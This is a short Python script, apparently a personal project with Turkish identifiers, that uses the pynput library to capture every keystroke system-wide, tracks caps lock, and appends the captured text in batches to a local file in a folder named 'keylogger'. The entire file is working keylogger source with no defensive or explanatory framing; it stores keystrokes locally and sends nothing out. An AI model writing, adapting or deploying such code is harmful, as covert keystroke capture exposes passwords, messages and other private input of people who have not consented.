from pynput.keyboard import Listener,Key
liste=list()
cpstatus=False
def bas(key):
    global liste,cpstatus
    try:
        if cpstatus:
            liste.append(key.char.upper())
        else:
            liste.append(key.char)

    except AttributeError:
        if  key==Key.space:
            liste.append(" ")
        if key==Key.enter:
            liste.append("\n")
        if key==Key.backspace:
            liste.append("'<-'")
        if key==Key.caps_lock:
            cpstatus=not cpstatus
    if len(liste) >=30:
        dosya_yaz()
        liste=list()

def birak(key):
    pass
def dosya_yaz():
    global liste

    with open("C:/Users/zeyne/OneDrive/Desktop/keylogger/key.txt","a",encoding="utf-8") as file:
        for x in liste:
            file.write(x)

with Listener(on_press=bas,on_release=birak) as Listener:
    Listener.join()
